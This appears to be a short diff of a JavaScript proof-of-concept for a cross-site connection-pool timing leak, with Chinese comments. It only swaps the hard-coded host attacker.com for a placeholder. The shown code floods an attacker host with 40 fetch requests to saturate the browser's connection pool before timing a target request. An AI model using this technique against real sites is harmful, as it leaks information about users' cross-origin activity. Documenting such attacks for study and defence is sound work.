@@ -365,7 +365,7 @@ async function connection_pool_leak(target_url) {
     // 步骤 1: 生成大量对攻击者服务器的请求，占满连接池
     const blockers = [];
     for (let i = 0; i < 40; i++) {
-        blockers.push(fetch(`https://attacker.com/block?i=${i}?x=${Math.random()}`));
+        blockers.push(fetch(`https://<attacker-domain>/block?i=${i}?x=${Math.random()}`));
     }
     
     // 步骤 2: 发送目标请求，测量其排队时间
